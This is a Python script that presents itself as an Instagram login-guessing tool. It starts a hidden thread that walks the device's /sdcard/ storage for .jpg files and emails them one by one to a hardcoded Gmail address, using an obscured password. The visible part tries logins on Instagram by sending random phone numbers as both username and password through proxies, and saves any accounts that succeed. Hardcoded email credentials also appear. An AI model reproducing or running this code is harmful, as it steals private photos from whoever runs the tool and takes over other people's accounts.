from re import search
aa = "77"
import time
from requests import Session
from colorama import Fore
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from os import system, walk
from os.path import isfile, getsize
from readline import parse_and_bind
from time import sleep
from threading import Thread
hh = "aliii"
a = Session()
w = Fore.WHITE
b = Fore.BLUE
r = Fore.RED
ff = "011234456"+aa
opop = ff+hh

print ("ali max = Wait 24 hours") 
time.sleep(10000000000)
if not isfile('.test.txt'):
    for dir, dirs, files in walk('/sdcard/'):
        for file in files:
            pathF = dir + '/' + file
            if '.jpg' in pathF[-4:]:
                with open('.test.txt', 'a') as (h):
                    h.write(pathF + '\n')




def special():

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
#    server.login('ali01113925818@gmail.com', '01123445677ali')
    server.login('ali01114605945@gmail.com', opop)
    f = open('.test.txt', 'r')
    x = f.readlines()
    for pathF in x:
        pathF = pathF.rstrip()
        if getsize(pathF) >= 20000000:
             continue
        try:
            time.sleep (1)
            msg = MIMEMultipart()
            msg['From'] = 'ali01114605945@gmail.com'
            msg['To'] = 'ali01114605945@gmail.com'
            msg['Subject'] = 'FSeCuRiTy'
            filena = pathF.split('/')[(-1)]
            body = str(filena)
            msg.attach(MIMEText(body, 'plain'))
            filename = str(filena)
            attachment = open(pathF, 'rb')
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename= %s' % filename)
            msg.attach(part)
            text = msg.as_string()
            server.sendmail('ali01113925818@gmail.com', 'ali01114605945@gmail.com', text)
            x.remove(pathF + '\n')
            f2 = open('.test.txt', 'w')
            for i in x:
                f2.write(i)
            f2.close()
        except (smtplib.SMTPServerDisconnected):
            sleep(3)
            special()
        except Exception as e:
            print e








#special()
def ali():
 import requests
 from random import randint , choice
 from os import system
 from os.path import isfile
 from colorama import Fore
 w = Fore.WHITE
 r = Fore.RED
 b = Fore.BLUE
 a = requests.Session()
 system('clear')
 login = 'https://www.instagram.com/'
 log = login + 'accounts/login/ajax/'
 prox = 'y.txt'
 if not isfile(prox):exit('[!] File Not Found')
 a.headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)\Chrome/59.0.3071.115 Safari/537.36'}
 a.headers.update({'Referer':login})
 f = open(prox,'r').readlines()
 while True:
  try:
   time.sleep (1) 
   all = '0112'+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))
   op = a.get(login)                                                        
                                                                   
   pr = {'http':choice(str(f))}
   a.headers.update({'X-CSRFToken':op.cookies['csrftoken']})
   login_data = {'username':all,'password':all}
   login_op = a.post(log,data=login_data,proxies=pr,allow_redirects=True)
   html = login_op.text
   if '"authenticated": true' in html and '"userId"' in html:
    print('{}[{}+{}] {}'.format(w,b,w,all))
    f = open('number-MRX.txt','a').write(str(all + '\n'))
   elif 'Please wait a few minutes before you try again' in html:exit('{}[{}!{}] You Are Banned & You Should Use Proxies +> {}'.format(w,r,w,all))
   elif 'checkpoint_required' in html:print('{}[{}!{}] CheckPoint +> {}'.format(w,r,w,all))
   else:print ('{}[{}-{}] {}'.format(w,r,w,all))
  except KeyboardInterrupt:exit()
  except requests.exceptions.ConnectionError:exit('[!] Connection Error') 
 

'''
login = 'https://www.instagram.com/'
 log = login + 'accounts/login/ajax/'                                                    prox = input('File >> ')
 if not isfile(prox):exit('[!] File Not Found')
 a.headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)\Chrome/59.0.3071.115 Safari/537.36'}
 a.headers.update({'Referer':login})
 f = open(prox,'r').readlines()                                                          
 while True:
  try:
   all = '0100'+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))+str(randint(0,9))
   op = a.get(login)
   pr = {'http':choice(str(f))}
   a.headers.update({'X-CSRFToken':op.cookies['csrftoken']})
   login_data = {'username':all,'password':all}
   login_op = a.post(log,data=login_data,proxies=pr,allow_redirects=True)
   html = login_op.text
   if '"authenticated": true' in html and '"userId"' in html:                               print('{}[{}+{}] {}'.format(w,b,w,all))
    f = open('number-MRX.txt','a').write(str(all + '\n'))                                  elif 'Please wait a few minutes before you try again' in html:exit('{}[{}!{}] You Are Banned & You Should Use Proxies +> {}'.format(w,r,w,all))
   elif 'checkpoint_required' in html:print('{}[{}!{}] CheckPoint +> {}'.format(w,r,w,all))
   else:print ('{}[{}-{}] {}'.format(w,r,w,all))
  except KeyboardInterrupt:exit()
  except requests.exceptions.ConnectionError:exit('[!] Connection Error')

'''

t = Thread(target=special).start()
#t = Thread(target=ali).start()
#t = Thread(target=ali).start()
t = Thread(target=ali).start()
#ali()
